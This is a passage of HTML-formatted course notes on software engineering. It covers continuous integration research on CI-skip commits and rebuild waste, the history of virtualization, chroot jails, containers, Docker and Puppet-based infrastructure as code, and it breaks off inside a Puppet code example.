        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Martin Fowler: Refactoring, Continuous Integration - verify automated build&lt;/li&gt;
&lt;li&gt;Cycle: build → git → build → test → report&lt;/li&gt;
&lt;li&gt;Tools:
&lt;ul&gt;
&lt;li&gt;Install: Jenkins, CruiseControl, Buildbot&lt;/li&gt;
&lt;li&gt;Cloud: Travis CI, GitHub Actions, Circle Ci&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://rebels.cs.uwaterloo.ca/papers/tse2018_gallaba.pdf&#34;&gt;An Empirical Study of Projects that (mis)use Travis CI&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Build job processing service
&lt;ul&gt;
&lt;li&gt;apply changes to latest source code, run tests, possible distribute&lt;/li&gt;
&lt;li&gt;configuration via language property, services, before_install, install&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Robust Build System&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Invest time creating and maintaining&lt;/li&gt;
&lt;li&gt;Issues: broken build or weird bugs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Flaky tests&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Result can fail even with the same input (non-deterministic behaviour)
&lt;ul&gt;
&lt;li&gt;False positive
&lt;ul&gt;
&lt;li&gt;Code might be fine and there is a loss in trust of the test&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;False negative
&lt;ul&gt;
&lt;li&gt;a test passes but it should&amp;rsquo;ve failed&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-to-read-a-paper&#34; &gt;How to Read a Paper
&lt;span&gt;
    &lt;a href=&#34;#how-to-read-a-paper&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;key contributions&lt;/li&gt;
&lt;li&gt;limitations&lt;/li&gt;
&lt;li&gt;replicate or extend&lt;/li&gt;
&lt;li&gt;three-pass approach
&lt;ol&gt;
&lt;li&gt;Rough overview (10 minutes)
&lt;ul&gt;
&lt;li&gt;Title, Abstract, Introduction&lt;/li&gt;
&lt;li&gt;Read section and subsection headings&lt;/li&gt;
&lt;li&gt;Read conclusion&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;??? see slides&lt;/li&gt;
&lt;li&gt;???&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://rebels.cs.uwaterloo.ca/papers/ase2023_maipradit.pdf&#34;&gt;An Empirical Study of the OpenStack Community&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Q1: The recheck command is used to rebuild without updating code in the discussion thread&lt;/li&gt;
&lt;li&gt;Q2 42% of rebuilds pass&lt;/li&gt;
&lt;li&gt;Q3: Justifiable waste is one recheck (that changes the status). 24% rechecks were justifiable (16.78 years of computational time out of 187.4 years)&lt;/li&gt;
&lt;li&gt;Q4: understanding how to reduce these wastes by better handling failed CI builds, further studies for better identification and awareness of such resource waste to developers, and tool support to reduce the waste produced by repeated rebuilds.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ci-resources-are-a-shared-commodity&#34; &gt;CI Resources are a shared commodity
&lt;span&gt;
    &lt;a href=&#34;#ci-resources-are-a-shared-commodity&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;build minutes&lt;/li&gt;
&lt;li&gt;user seats&lt;/li&gt;
&lt;li&gt;tragedy of the commons
&lt;ul&gt;
&lt;li&gt;unfettered access to a resource&lt;/li&gt;
&lt;li&gt;no formal rules to regulate access&lt;/li&gt;
&lt;li&gt;accelerated depreciation of a resource due to self-interest&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Cost of rechecking&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OpenStack wasted: 187.4 build years
&lt;ul&gt;
&lt;li&gt;developer cost is 16.81 years waiting for re-checks&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;precisions and recall&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ci-acceleration&#34; &gt;CI Acceleration
&lt;span&gt;
    &lt;a href=&#34;#ci-acceleration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;mitigating the re-check riot problem&lt;/li&gt;
&lt;li&gt;cloud-based CI solutions tacitly encourage wasteful behaviour
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;runs-on: ubuntu-latest&lt;/code&gt; (starting with a fresh container, no reusability)
&lt;ul&gt;
&lt;li&gt;a fresh copy is cloned (wasteful bandwith)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Does every change require a CI run?
&lt;ul&gt;
&lt;li&gt;Updates to comments in the code&lt;/li&gt;
&lt;li&gt;Only updates the README.md&lt;/li&gt;
&lt;li&gt;Changes an area not tested by the CI test suite&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Existing solutions
&lt;ul&gt;
&lt;li&gt;CI skip&lt;/li&gt;
&lt;li&gt;Github allows devs to indicate change sets that do not require a build&lt;/li&gt;
&lt;li&gt;Magic phrase in the commit message &lt;a href=&#34;https://docs.github.com/en/actions/managing-workflow-runs/skipping-workflow-runs&#34;&gt;github: skipping workflow runs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://ieeexplore.ieee.org/abstract/document/8633335&#34;&gt;Which Commits Can Be CI Skipped?&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Our findings show that our rule-based technique can detect and label CI commits with an Areas Under the Curve between 0.56 and 0.98 (average of 0.73)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;On average, 18.16% of commits are skipped&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/suhaibmujahid/ci-skipper&#34;&gt;CI-Skipper prototype&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Feb 2017&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TravisTorrent Dataset&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Need to create rules to skip CI on commits&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Security implications?&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Q1. Rules derived based on commits that were explicitly skipped by real developers&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Q2. 0.73 (false positives against false negatives)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Q3. impact of source code analysis on ci-skipper, build commits are predicted to be CI skip commits but they result in fail builds, machine learning techniques&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Precision (noise in signal) = (true positive) / (true positive + false positive)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Recall (completeness / end goal) = (true positives) / (true positives + false negatives)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;f1 = 2 * (p * r) / (p + r)&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;tp vs fp (receiver operator characteristic curve)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;an AUC sets a coin flip to 0.5, so we know that the classifier is better when it is greater than 0.5&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://ieeexplore.ieee.org/abstract/document/8961089&#34;&gt;A Machine Learning Approach to Improve the Detection of CI Skip Commits&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Decision trees were used to produce classifiers. Why? Average AUC equal to 0.89&lt;/li&gt;
&lt;li&gt;F1-score of 0.79 (AUC = 0.89), on average. This improvement equates to an average   improvement of 2.4X&lt;/li&gt;
&lt;li&gt;cross-project classifier has as 1.5X over baseline
&lt;ul&gt;
&lt;li&gt;baseline is the ratio of CI skip commits in the studied projects&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;within project means tested on ourselves (past to future) whereas cross-project means trained on one project and used on another&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://dl.acm.org/doi/pdf/10.1145/3377811.3380437&#34;&gt;A cost-efficient approach to building in continuous integration&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;costs millions of dollars to Mozilla and Google&lt;/li&gt;
&lt;li&gt;the value is letting developers find bugs early&lt;/li&gt;
&lt;li&gt;want to fail builds as early as possible&lt;/li&gt;
&lt;li&gt;SmartBuildSkip: prediction
&lt;ul&gt;
&lt;li&gt;first failure means later builds are more likely to fail&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Midterm Cutoff&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;virtualization&#34; &gt;Virtualization
&lt;span&gt;
    &lt;a href=&#34;#virtualization&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Virtual Machines emulate a computer system and provide a computer system within another computer system&lt;/li&gt;
&lt;li&gt;Needed for sharing infrastructure users to give the impression that each user has their own machine&lt;/li&gt;
&lt;li&gt;Shippable environment: makes an entire stack shippable with the operating system (e.g. GitHub)&lt;/li&gt;
&lt;li&gt;System virtualization: &amp;ldquo;full&amp;rdquo;; hosts an entire operating system&lt;/li&gt;
&lt;li&gt;Process virtualization: isolate software to run on the underlying problem&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;history-of-virtualization&#34; &gt;History of Virtualization
&lt;span&gt;
    &lt;a href=&#34;#history-of-virtualization&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;1960s
&lt;ul&gt;
&lt;li&gt;Goal: need to run legacy software on newer hardware&lt;/li&gt;
&lt;li&gt;Result: CP-67 mainframe system that supported virtualization&lt;/li&gt;
&lt;li&gt;Pros: Isolation; one user crashing wouldn&amp;rsquo;t effect another&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1980s
&lt;ul&gt;
&lt;li&gt;Goal: treat a directory as another root directory&lt;/li&gt;
&lt;li&gt;Results: &lt;code&gt;chroot&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Pro: Share of system and kernel level features&lt;/li&gt;
&lt;li&gt;Java
&lt;ul&gt;
&lt;li&gt;Goal: compile-once-run-anywhere&lt;/li&gt;
&lt;li&gt;JVM: abstracts hardware details&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1990s
&lt;ul&gt;
&lt;li&gt;VMWare&lt;/li&gt;
&lt;li&gt;Hypervisor (virtual machine monitors) types
&lt;ul&gt;
&lt;li&gt;Bare metal, where the hypervisor is running on hardware&lt;/li&gt;
&lt;li&gt;Hosted: a host OS is running on the hardware which runs the hypervisor&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ESX Server: run VMs without a host OS&lt;/li&gt;
&lt;li&gt;GSX Server: run VMs on Windows&lt;/li&gt;
&lt;li&gt;Workstations: Run VMs on Unix&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;00s and 10s
&lt;ul&gt;
&lt;li&gt;Containers
&lt;ul&gt;
&lt;li&gt;First appeared in Solaris 10 (2005), followed by Linux in 2008&lt;/li&gt;
&lt;li&gt;Zones allow lightweight isolation with shared core of OS, system and apps&lt;/li&gt;
&lt;li&gt;Containers popularized by Docker (2013), which automates deployment&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-to-chroot-jail&#34; &gt;How to chroot jail
&lt;span&gt;
    &lt;a href=&#34;#how-to-chroot-jail&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;SSH into the instance&lt;/li&gt;
&lt;li&gt;Create a dir called jail&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cp /bin/bash jail/bin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ldd&lt;/code&gt;: list shared libs needed for bash&lt;/li&gt;
&lt;li&gt;create lib and lib64 in jail dir and copy libs over&lt;/li&gt;
&lt;li&gt;run chroot to change root into jail. Repeat process to add ls and vim to jail&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Super painful.&lt;/p&gt;
&lt;h3 id=&#34;linux-support-for-containers-lxc&#34; &gt;Linux Support for Containers (LXC)
&lt;span&gt;
    &lt;a href=&#34;#linux-support-for-containers-lxc&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Set of processes running on top of a common kernel&lt;/li&gt;
&lt;li&gt;Isolated from rest and cannot impact each other or the host&lt;/li&gt;
&lt;li&gt;cgroups
&lt;ul&gt;
&lt;li&gt;Control Groups&lt;/li&gt;
&lt;li&gt;Allow system to control access to system resource (meter, limit, restrict)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;docker&#34; &gt;Docker
&lt;span&gt;
    &lt;a href=&#34;#docker&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://blog.elijahlopez.ca/posts/docker-guide&#34;&gt;Notes extracted to /posts/docker-guide&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;traditional-development&#34; &gt;Traditional Development
&lt;span&gt;
    &lt;a href=&#34;#traditional-development&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Python runtime on the development machine&lt;/li&gt;
&lt;li&gt;Choice of Python runtime on development machine imposes constraints on the runtime that can be used in production&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;infrastructure-as-code&#34; &gt;Infrastructure as Code
&lt;span&gt;
    &lt;a href=&#34;#infrastructure-as-code&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;What is configuration?
&lt;ul&gt;
&lt;li&gt;Networking&lt;/li&gt;
&lt;li&gt;Kernel features&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Application and Middleware
&lt;ul&gt;
&lt;li&gt;Spring Boot
&lt;ul&gt;
&lt;li&gt;bean configuration&lt;/li&gt;
&lt;li&gt;Component settings&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;httpd:
&lt;ul&gt;
&lt;li&gt;plugins&lt;/li&gt;
&lt;li&gt;documentroot&lt;/li&gt;
&lt;li&gt;SSL&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Writing configuration as code. Can be stored in a VCS. Manage and provision machines using code-like syntax rather tha interactive configuration tools. Automatically executed to perform tasks.&lt;/p&gt;
&lt;p&gt;Technologies: puppet, chef, terraform, ansible, SaltStack&lt;/p&gt;
&lt;h3 id=&#34;puppet-notes&#34; &gt;Puppet Notes
&lt;span&gt;
    &lt;a href=&#34;#puppet-notes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Quest exercises were done
&lt;ul&gt;
&lt;li&gt;ssh password for nodes is puppet&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;sudo puppet resource&lt;/code&gt; to check a resource such as &lt;code&gt;package httpd&lt;/code&gt; or &lt;code&gt;file /tmp/test&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;To use a module for a node, you need to include it or instantiate the class inside &lt;code&gt;site.pp&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/puppetlabs/code/environments/production/manifests/site.pp&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Validation: &lt;code&gt;puppet parser validate pasture/manifests/init.pp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The puppet server also has a admin portal
&lt;ul&gt;
&lt;li&gt;Role-based access control system (RBAC)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example module init file&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-puppet&#34; data-lang=&#34;puppet&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# /etc/puppetlabs/code/environments/production/manifests/site.pp&lt;/span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;node&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pasture.puppet.vm&amp;#39;&lt;/span&gt; {&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;class&lt;/span&gt; { &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pasture&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#bbb&#34;&gt;default_character&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;bunny&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;  }&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;&lt;/span&gt;}&lt;span style=&#34;color:#a61717;background-color:#e3d2d2&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;explanations
&lt;ul&gt;
&lt;li&gt;notify service: want to restart a service when a resource changes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-puppet&#34; data-lang=&#34;puppet&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# /etc/puppetlabs/code/environments/production/modules/pasture/manifests/init.pp
